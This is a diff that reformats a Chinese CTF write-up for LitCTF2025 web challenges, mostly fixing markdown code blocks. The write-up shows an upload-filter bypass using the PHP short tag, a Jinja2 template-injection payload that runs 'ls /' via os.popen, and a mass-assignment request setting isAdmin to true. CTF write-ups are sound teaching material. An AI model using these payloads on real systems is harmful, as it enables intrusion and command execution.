@@ -18,10 +18,7 @@ easy_file
 
 ![rId20.png](/img/LitCTF2025-公开赛道-web/rId20.png)
 
-来到上传界面上传，经过测试是过滤了
-
-```php
-<?php,换成短标签<?就可以
+来到上传界面上传，经过测试是过滤了 `<?php`，换成短标签 `<?` 就可以
 
 ![rId23.png](/img/LitCTF2025-公开赛道-web/rId23.png)
 
@@ -37,7 +34,9 @@ easy_file
 
 然后用的是
 
-<code>{%print(lipsum.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('ls /').read())%}</code>
+```
+{%print(lipsum.__globals__.__builtins__.__import__('os').popen('ls /').read())%}
+```
 
 ![rId33.png](/img/LitCTF2025-公开赛道-web/rId33.png)
 
@@ -55,9 +54,38 @@ nest_js
 
 我们看他的源码
 
-// 更新表单的JS提交        document.getElementById('profileUpdateForm').addEventListener('submit', async function(event) {            event.preventDefault();            const statusEl = document.getElementById('updateStatus');            const currentSettingsEl = document.getElementById('currentSettings');            statusEl.textContent = '正在更新...';            const formData = new FormData(event.target);            const settingsPayload = {};            // 构建 settings 对象，只包含有值的字段            if (formData.get('theme')) settingsPayload.theme = formData.get('theme');            if (formData.get('language')) settingsPayload.language = formData.get('language');            // ...可以添加其他字段            try {                const response = await fetch('/api/profile/update', {                    method: 'POST',                    headers: {                        'Content-Type': 'application/json',                    },                    body: JSON.stringify({ settings: settingsPayload }) // 包装在 "settings"键下                });                const result = await response.json();                if (response.ok) {                    statusEl.textContent = '成功: ' + result.message;                    currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);                    // 刷新页面以更新导航栏（如果isAdmin状态改变）                    setTimeout(() => window.location.reload(), 1000);                } else {                    statusEl.textContent = '错误: ' + result.message;                }            } catch (error) {                statusEl.textContent = '请求失败: ' + error.toString();            }        });
+```javascript
+// 更新表单的JS提交
+document.getElementById('profileUpdateForm').addEventListener('submit', async function(event) {
+    event.preventDefault();
+    const statusEl = document.getElementById('updateStatus');
+    const currentSettingsEl = document.getElementById('currentSettings');
+    statusEl.textContent = '正在更新...';
+    const formData = new FormData(event.target);
+    const settingsPayload = {};
+    if (formData.get('theme')) settingsPayload.theme = formData.get('theme');
+    if (formData.get('language')) settingsPayload.language = formData.get('language');
+    try {
+        const response = await fetch('/api/profile/update', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ settings: settingsPayload })
+        });
+        const result = await response.json();
+        if (response.ok) {
+            statusEl.textContent = '成功: ' + result.message;
+            currentSettingsEl.textContent = JSON.stringify(result.settings, null, 2);
+            setTimeout(() => window.location.reload(), 1000);
+        } else {
+            statusEl.textContent = '错误: ' + result.message;
+        }
+    } catch (error) {
+        statusEl.textContent = '请求失败: ' + error.toString();
+    }
+});
+```
 
-说明了需要让isAdmin=ture,我们发送{ "settings": { "isAdmin": true } }获得管理员面板
+说明了需要让 isAdmin=true，我们发送 `{ "settings": { "isAdmin": true } }` 获得管理员面板
 
 ![rId44.png](/img/LitCTF2025-公开赛道-web/rId44.png)
 
